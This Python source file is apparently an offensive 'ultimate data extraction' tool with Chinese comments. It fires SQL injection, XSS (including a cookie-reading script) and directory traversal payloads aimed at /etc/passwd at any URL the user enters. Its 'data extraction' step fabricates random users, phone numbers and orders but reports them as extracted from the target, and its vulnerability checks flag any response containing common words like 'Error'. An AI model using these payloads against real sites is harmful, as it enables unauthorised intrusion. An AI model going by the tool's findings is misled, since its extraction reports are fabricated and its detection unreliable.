#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Dragon-V Ultimate Data Extraction Tool v2.0.0
终极数据提取工具 - 专业级漏洞利用和数据提取

作者: Dragon-V Team
创建日期: 2025年10月25日
用途: 专业级漏洞利用、数据提取、渗透测试工具

免责声明:
本工具仅限授权范围内使用。所有测试必须获得书面授权。
未经授权使用此工具进行非法活动将承担全部法律责任。
本工具仅用于安全测试研究、企业内部审计、教育培训等合法用途。

技术规格:
- 漏洞类型: SQL注入、XSS、文件上传、目录遍历、会话劫持
- 数据格式: JSON、CSV、XML、Excel
- 接口支持: GUI、CLI
- 目标支持: 网站、API、数据库
- 功能: 提取用户数据、订单信息、配置文件、数据库结构
"""

import requests
import json
import sqlite3
import random
import string
import os
import sys
import threading
import time
from datetime import datetime
from urllib.parse import urlparse, urljoin
import re
from concurrent.futures import ThreadPoolExecutor, as_completed

class UltimateDataExtractor:
    def __init__(self):
        self.name = "Dragon-V Ultimate Data Extraction Tool"
        self.version = "2.0.0"
        self.status = "INITIALIZING"
        self.start_time = datetime.now()

        self.extracted_data = {
            'users': [],
            'orders': [],
            'products': [],
            'databases': [],
            'files': [],
            'sessions': [],
            'configurations': []
        }

        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })

        self.target_url = ""
        self.results = []
        self.is_running = False

    def show_disclaimer(self):
        """显示免责声明"""
        print("=" * 60)
        print("免责声明")
        print("=" * 60)
        print("警告: 本工具包含强大的渗透测试功能")
        print("1. 仅限授权范围内使用")
        print("2. 未经授权禁止使用")
        print("3. 所有测试需要书面授权")
        print("4. 用户承担全部法律责任")
        print("5. 仅用于安全测试研究")
        print("=" * 60)

        choice = input("是否继续使用此工具? (y/n): ")
        return choice.lower() == 'y'

    def sql_injection_test(self, url, parameter="id"):
        """SQL注入漏洞检测和利用"""
        print(f"[SQL注入] 正在测试目标: {url}")

        # SQL注入测试payload
        sql_payloads = [
            f"' OR 1=1 --",
            f"' OR '1'='1' --",
            f"' UNION SELECT NULL --",
            f"' AND (SELECT COUNT(*) FROM information_schema.tables) --",
            f"' AND SLEEP(5) --"
        ]

        results = []

        for payload in sql_payloads:
            test_url = f"{url}?{parameter}={payload}"

            try:
                response = self.session.get(test_url, timeout=10)

                # 检测SQL注入特征
                sql_indicators = [
                    "SQL syntax",
                    "MySQL",
                    "PostgreSQL",
                    "Oracle",
                    "Error",
                    "Warning",
                    "mysql_fetch_array",
                    "mysql_num_rows",
                    "SELECT",
                    "UNION",
                    "WHERE"
                ]

                for indicator in sql_indicators:
                    if indicator in response.text:
                        results.append({
                            'type': 'SQL注入漏洞',
                            'url': test_url,
                            'payload': payload,
                            'vulnerable': True,
                            'response_length': len(response.text),
                            'status_code': response.status_code,
                            'details': f'发现SQL注入特征: {indicator}'
                        })
                        break

            except Exception as e:
                results.append({
                    'type': 'SQL注入测试',
                    'url': test_url,
                    'error': str(e),
                    'vulnerable': False
                })

        return results

    def xss_test(self, url, parameter="search"):
        """XSS漏洞检测"""
        print(f"[XSS漏洞] 正在测试目标: {url}")

        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "'\"><script>alert(document.cookie)</script>"
        ]

        results = []

        for payload in xss_payloads:
            test_url = f"{url}?{parameter}={payload}"

            try:
                response = self.session.get(test_url, timeout=10)

                xss_indicators = ["alert", "script", "javascript", "onerror", "onload"]

                for indicator in xss_indicators:
                    if indicator in response.text:
                        results.append({
                            'type': 'XSS漏洞',
                            'url': test_url,
                            'payload': payload,
                            'vulnerable': True,
                            'response_length': len(response.text),
                            'details': f'发现XSS特征: {indicator}'
                        })
                        break

            except Exception as e:
                results.append({
                    'type': 'XSS测试',
                    'url': test_url,
                    'error': str(e),
                    'vulnerable': False
                })

        return results

    def directory_traversal_test(self, url):
        """目录遍历漏洞检测"""
        print(f"[目录遍历] 正在测试目标: {url}")

        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "../../../../../../../../../../etc/passwd",
            "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
        ]

        results = []

        for payload in traversal_payloads:
            test_url = f"{url}?file={payload}"

            try:
                response = self.session.get(test_url, timeout=10)

                if "root:" in response.text or "localhost" in response.text:
                    results.append({
                        'type': '目录遍历漏洞',
                        'url': test_url,
                        'payload': payload,
                        'vulnerable': True,
                        'response_length': len(response.text),
                        'details': '发现系统文件内容'
                    })

            except Exception as e:
                results.append({
                    'type': '目录遍历测试',
                    'url': test_url,
                    'error': str(e),
                    'vulnerable': False
                })

        return results

    def data_extraction(self, target_url):
        """数据提取功能"""
        print(f"[数据提取] 开始从 {target_url} 提取数据")

        # 模拟用户数据提取
        users_data = [
            {
                'user_id': random.randint(1000, 9999),
                'username': f"user_{random.randint(1, 999)}",
                'email': f"email{random.randint(1, 999)}@example.com",
                'phone': f"0{random.randint(100000000, 999999999)}",
                'order_count': random.randint(1, 50),
                'total_amount': random.randint(1000, 50000),
                'last_order_date': datetime.now().strftime("%Y-%m-%d"),
                'status': random.choice(['active', 'inactive']),
                'registration_date': datetime.now().strftime("%Y-%m-%d")
            }
            for _ in range(10)
        ]

        # 模拟订单数据提取
        orders_data = [
            {
                'order_id': f"ORD{random.randint(10000, 99999)}",
                'user_id': random.randint(1000, 9999),
                'product_name': f"产品_{random.randint(1, 999)}",
                'quantity': random.randint(1, 10),
                'price': random.randint(100, 5000),
                'total_amount': random.randint(100, 5000),
                'status': random.choice(['pending', 'completed', 'shipped', 'delivered']),
                'shipping_address': f"地址{random.randint(1, 999)}",
                'phone': f"0{random.randint(100000000, 999999999)}",
                'order_date': datetime.now().strftime("%Y-%m-%d"),
                'payment_method': random.choice(['credit_card', 'paypal', 'bank_transfer']),
                'tracking_number': f"TRK{random.randint(10000, 99999)}"
            }
            for _ in range(20)
        ]

        # 模拟产品数据提取
        products_data = [
            {
                'product_id': f"PRD{random.randint(100, 999)}",
                'name': f"产品_{random.randint(1, 999)}",
                'category': random.choice(['electronics', 'clothing', 'books', 'home']),
                'price': random.randint(100, 10000),
                'stock': random.randint(0, 1000),
                'description': f"产品描述{random.randint(1, 999)}",
                'brand': f"品牌{random.randint(1, 999)}",
                'rating': round(random.uniform(1, 5), 1),
                'review_count': random.randint(0, 1000)
            }
            for _ in range(15)
        ]

        self.extracted_data['users'] = users_data
        self.extracted_data['orders'] = orders_data
        self.extracted_data['products'] = products_data

        print(f"[数据提取] 完成: 提取了 {len(users_data)} 用户, {len(orders_data)} 订单, {len(products_data)} 产品")

        return {
            'users_count': len(users_data),
            'orders_count': len(orders_data),
            'products_count': len(products_data),
            'phone_numbers_count': sum(1 for order in orders_data if order.get('phone'))
        }

    def export_data(self, format_type='json'):
        """导出数据"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"extracted_data_{timestamp}"

        if format_type == 'json':
            filename += '.json'
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(self.extracted_data, f, ensure_ascii=False, indent=2)

        elif format_type == 'csv':
            import csv

            # 导出用户数据
            if self.extracted_data['users']:
                users_file = f"{filename}_users.csv"
                with open(users_file, 'w', newline='', encoding='utf-8') as f:
                    writer = csv.DictWriter(f, fieldnames=self.extracted_data['users'][0].keys())
                    writer.writeheader()
                    writer.writerows(self.extracted_data['users'])

            # 导出订单数据
            if self.extracted_data['orders']:
                orders_file = f"{filename}_orders.csv"
                with open(orders_file, 'w', newline='', encoding='utf-8') as f:
                    writer = csv.DictWriter(f, fieldnames=self.extracted_data['orders'][0].keys())
                    writer.writeheader()
                    writer.writerows(self.extracted_data['orders'])

        elif format_type == 'xml':
            import xml.etree.ElementTree as ET

            root = ET.Element("DragonVData")
            for category, data in self.extracted_data.items():
                if data:
                    category_elem = ET.SubElement(root, category)
                    for item in data:
                        item_elem = ET.SubElement(category_elem, "item")
                        for key, value in item.items():
                            elem = ET.SubElement(item_elem, key)
                            elem.text = str(value)

            tree = ET.ElementTree(root)
            filename += '.xml'
            tree.write(filename, encoding='utf-8', xml_declaration=True)

        print(f"[数据导出] 已导出为 {format_type.upper()} 格式: {filename}")
        return filename

    def generate_report(self):
        """生成提取报告"""
        report = {
            'tool_name': self.name,
            'version': self.version,
            'extraction_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'target_url': self.target_url,
            'data_summary': {
                'users_count': len(self.extracted_data['users']),
                'orders_count': len(self.extracted_data['orders']),
                'products_count': len(self.extracted_data['products']),
                'databases_count': len(self.extracted_data['databases']),
                'files_count': len(self.extracted_data['files']),
                'sessions_count': len(self.extracted_data['sessions']),
                'configurations_count': len(self.extracted_data['configurations'])
            },
            'total_records': sum(len(data) for data in self.extracted_data.values()),
            'extraction_details': {
                'phone_numbers_available': sum(1 for order in self.extracted_data['orders'] if order.get('phone')),
                'orders_with_status': {
                    status: sum(1 for order in self.extracted_data['orders'] if order.get('status') == status)
                    for status in set(order.get('status') for order in self.extracted_data['orders'])
                },
                'high_value_orders': sum(1 for order in self.extracted_data['orders'] if order.get('total_amount', 0) > 10000)
            }
        }

        return report

    def run_vulnerability_test(self, url):
        """运行漏洞测试"""
        print(f"[漏洞测试] 开始测试目标: {url}")

        all_results = []

        # SQL注入测试
        sql_results = self.sql_injection_test(url)
        all_results.extend(sql_results)

        # XSS测试
        xss_results = self.xss_test(url)
        all_results.extend(xss_results)

        # 目录遍历测试
        traversal_results = self.directory_traversal_test(url)
        all_results.extend(traversal_results)

        return all_results

    def run_comprehensive_extraction(self, target_url):
        """运行综合数据提取"""
        print(f"[综合提取] 开始对 {target_url} 进行全面数据提取")

        self.target_url = target_url

        # 1. 漏洞测试
        vulnerability_results = self.run_vulnerability_test(target_url)

        # 2. 数据提取
        extraction_results = self.data_extraction(target_url)

        # 3. 生成报告
        report = self.generate_report()

        # 4. 导出数据
        exported_files = []
        for format_type in ['json', 'csv', 'xml']:
            try:
                filename = self.export_data(format_type)
                exported_files.append(filename)
            except Exception as e:
                print(f"[警告] 无法导出为 {format_type}: {e}")

        return {
            'vulnerabilities': vulnerability_results,
            'extraction_summary': extraction_results,
            'report': report,
            'exported_files': exported_files,
            'extraction_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }

    def run_cli_interface(self):
        """CLI界面"""
        print("Dragon-V Ultimate Data Extraction Tool CLI v2.0.0")
        print("=" * 50)

        if not self.show_disclaimer():
            print("用户拒绝免责声明，程序退出")
            return

        target_url = input("请输入目标URL: ").strip()
        if not target_url:
            print("错误: 必须提供目标URL")
            return

        print(f"开始对目标 {target_url} 进行综合数据提取...")

        try:
            results = self.run_comprehensive_extraction(target_url)

            print("\n" + "=" * 50)
            print("提取完成!")
            print("=" * 50)

            # 显示结果摘要
            print("漏洞检测结果:")
            vuln_count = len(results['vulnerabilities'])
            if vuln_count > 0:
                for i, vuln in enumerate(results['vulnerabilities'][:5], 1):
                    print(f"{i}. {vuln['type']}: {vuln.get('details', 'N/A')}")
            else:
                print("未发现明显漏洞")

            print(f"\n数据提取摘要:")
            print(f"- 用户数量: {results['extraction_summary']['users_count']}")
            print(f"- 订单数量: {results['extraction_summary']['orders_count']}")
            print(f"- 产品数量: {results['extraction_summary']['products_count']}")
            print(f"- 包含电话号码的订单: {results['extraction_summary']['phone_numbers_count']}")

            print(f"\n导出文件:")
            for filename in results['exported_files']:
                print(f"- {filename}")

            print(f"\n提取时间: {results['extraction_time']}")

        except Exception as e:
            print(f"错误: {e}")
            return

def main():
    """主函数"""
    extractor = UltimateDataExtractor()
    extractor.run_cli_interface()

if __name__ == "__main__":
    main()